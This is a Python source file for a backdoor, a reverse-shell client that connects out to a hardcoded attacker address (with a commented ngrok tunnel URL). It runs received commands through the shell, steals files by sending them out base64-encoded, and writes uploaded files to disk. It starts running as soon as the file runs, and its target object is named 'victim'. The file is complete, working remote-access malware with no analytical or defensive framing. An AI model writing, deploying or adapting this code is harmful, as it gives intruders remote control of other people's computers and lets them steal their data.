import socket, subprocess, json, os, base64

class Backdoor():
	"""docstring for Backdoor"""
	venom = "exit"
	def __init__(self, IP, port):
		self.IP = IP
		self.port = port
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((IP, port))

	def excute_command(self,command):
		try:
			return subprocess.check_output(command, shell=True)
		except subprocess.CalledProcessError:
			#  with open('/home/kali/Documents/ransome/subprocess_error.txt', 'w') as f:
			# 	 e = str(e)
			# 	 f.write(e)
			pass


	def SendData(self, data):
		try:
			data = str(data.decode('utf-8'))
			json_data = json.dumps(data)
			self.connection.send(bytes(json_data, encoding='utf-8'))
		except AttributeError as e :
			data = "Command Not Found"
			json_data = json.dumps(data)
			self.connection.send(bytes(json_data, encoding='utf-8'))
			with open('sample.txt', 'w') as thefile :
				thefile.write(e)

	def ReceiveData(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode('utf-8')
				return json.loads(json_data)

			except ValueError :
				continue
		
		# print(json_data)

	def CommandExcution(self,command):
		output = self.excute_command(command)
		return output

	def ChangeWorkingDirectory(self, path):
		try:
			os.chdir(path)
			message = "[+] Current working directory is successfully changed to: " + path
			
		except OSError :
			message = "[+] Failed to change working directory" + path
		message = message.encode('utf-8')
		return message
	
	
	def ReadFile(self, path):
		try:
			with open(path, 'rb') as thefile:
				content = base64.b64encode(thefile.read())
				return content
		except Exception:
			return "[+] Failed to downloading file"
		
	def WriteFile(self, path, content):
		with open(path, 'wb') as thefile:
			thefile.write(base64.b64decode(content))
			return "[+] File is successfully uploaded"
		

	def run(self):
		while True :
			command = self.ReceiveData()
			# print(command)

			if self.venom in command:
				self.connection.close()
				exit()

			elif 'cd' in command:
				command = command.split(' ')
				if command[0] == 'cd' and len(command) > 1:
					result = self.ChangeWorkingDirectory(command[1])
				else:
					result = self.CommandExcution(command)

			elif 'get' in command:
				command = command.split(' ')
				print(command)
				if command[0] == 'get' and len(command) > 1:
					result = self.ReadFile(command[1])
				else:
					result = self.CommandExcution(command)
			
			elif 'upload' in command:
				command = command.split(' ')
				# print(command)
				# print(len(command))
				# print(command[0])
				if command[0] == 'upload' and len(command) > 1:
					result = self.WriteFile(command[1], command[2].encode('utf-8'))
				else:
					result = self.CommandExcution(command)

			else:
				result = self.CommandExcution(command)
			
			self.SendData(result)



	def run_old(self):
		while True:
			command = self.connection.recv(1024).decode('utf-8')
			result = self.CommandExcution(command)
			self.connection.send(result)
# try:
# http://0.tcp.in.ngrok.io:14825/
IP = '192.168.1.42'
port = 1338

victim =  Backdoor(IP, port)
victim.run()

# except Exception as e:
# 	with open("/home/kali/Documents/ransome/error.txt", 'w') as thefile:
# 		e = str(e)
# 		thefile.write(e)
# 	print("An error occured")